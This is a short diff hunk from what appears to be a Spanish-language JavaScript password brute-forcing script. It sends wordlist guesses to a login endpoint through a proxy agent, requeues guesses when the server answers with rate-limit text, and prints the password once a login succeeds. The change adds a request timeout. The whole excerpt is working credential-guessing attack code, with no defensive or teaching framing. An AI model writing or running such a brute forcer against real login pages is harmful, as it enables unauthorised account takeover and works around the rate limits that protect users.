@@ -109,7 +109,7 @@ body[keys[1]] = contraseña;
 
        
 
-            axios.post(urlfinal,body,{httpAgent:agent,httpsAgent:agent,headers:{"Content-Type":header,'Host':objURL.hostname}})
+            axios.post(urlfinal,body,{httpAgent:agent,httpsAgent:agent,headers:{"Content-Type":header,'Host':objURL.hostname},timeout:6000,keepAlive:false})
 
      .then(function(data){if(data.data.includes("to many")){wordlist.unshift(contraseña)}if(!data.data.includes("to many")){++num_de_peticiones; console.log(num_de_peticiones);console.log("contraseña incorrecta:",contraseña);}; if(!data.data.includes("error")){console.log("la contraseña es:",contraseña); contraseña_encontrada=true; return}}).catch(function(error){console.log("error",error)})
 
